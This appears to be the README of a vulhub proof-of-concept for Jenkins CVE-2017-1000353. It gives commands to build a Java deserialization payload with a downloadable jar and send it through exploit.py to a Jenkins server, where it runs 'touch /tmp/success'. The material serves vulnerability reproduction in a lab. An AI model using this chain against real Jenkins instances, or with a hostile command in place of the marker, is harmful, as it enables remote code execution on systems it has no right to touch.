# CVE-2017-1000353 POC

How to reproduce the Jenkins CVE-2017-1000353？

Clone this repository, use the pre-built payload `jenkins_poc.ser` with flowing command:

```
python exploit.py http://your-ip:8080 jenkins_poc.ser
```

Then the `touch /tmp/success` would be executed.

## Java Version Requirements

**Important**: The payload generation is dependent on the Java version. It has been successfully tested with `openjdk:8u292`. Other Java versions may not work properly for payload generation and exploitation.

## How to generate the payload `jenkins_poc.ser`？

Download [CVE-2017-1000353-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar).

```
java -jar CVE-2017-1000353-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
```

If you're using Docker, you can use the following command to ensure compatibility:

```
docker run --rm -v $(pwd):/work -w /work openjdk:8u292 java -jar CVE-2017-1000353-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
```

## Reference

https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2017-1000353
